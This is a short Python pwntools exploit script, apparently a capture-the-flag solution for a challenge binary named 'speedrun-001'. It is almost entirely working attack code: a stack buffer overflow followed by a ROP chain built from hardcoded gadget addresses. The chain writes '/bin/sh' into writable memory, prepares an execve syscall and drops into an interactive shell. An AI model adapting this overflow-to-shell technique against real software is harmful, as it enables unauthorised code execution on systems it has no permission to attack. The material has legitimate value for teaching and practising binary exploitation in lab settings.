#!/usr/bin/python3
from pwn import *
target = process('./speedrun-001')
# buffer overflow after 1024
payload = b'a'*1024
# gef vmmap shows rw memory starts at
# 0x00000000006b6000
popRax = p64(0x0000000000415664)
popRsi = p64(0x00000000004101f3)
popRdi = p64(0x0000000000400686)
popRdx = p64(0x00000000004498b5)
writeCall = p64(0x000000000048d251)
syscall = p64(0x000000000040129c)
'''
write "/bin/sh" to 0x6b6000
pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
payload += popRdx
payload += b"/bin/sh\x00"
payload += popRax
payload += p64(0x6b6000)
payload += writeCall
'''
Prep the four registers with their arguments, and make the syscall
pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0
syscall
'''
payload += popRax
payload += p64(0x3b)
payload += popRdi
payload += p64(0x6b6000)
payload += popRsi
payload += p64(0)
payload += popRdx
payload += p64(0)
payload += syscall
target.send(payload)
target.interactive()
